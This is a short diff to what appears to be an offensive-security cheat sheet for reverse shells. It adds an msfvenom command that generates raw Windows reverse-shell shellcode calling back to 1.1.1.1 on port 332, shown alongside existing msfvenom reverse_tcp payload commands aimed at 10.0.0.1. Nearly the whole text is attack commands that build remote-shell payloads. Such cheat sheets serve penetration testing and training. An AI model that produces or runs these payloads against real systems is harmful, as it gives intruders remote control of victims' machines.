@@ -405,6 +405,7 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4242 -f exe > r
 
 ```powershell
 msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4242 -f exe > reverse.exe
+msfvenom -p windows/shell_reverse_tcp -f raw -o sc_x86_msf.bin EXITFUNC=thread LHOST=1.1.1.1 LPORT=332
 ```
 
 ### Linux Staged reverse TCP
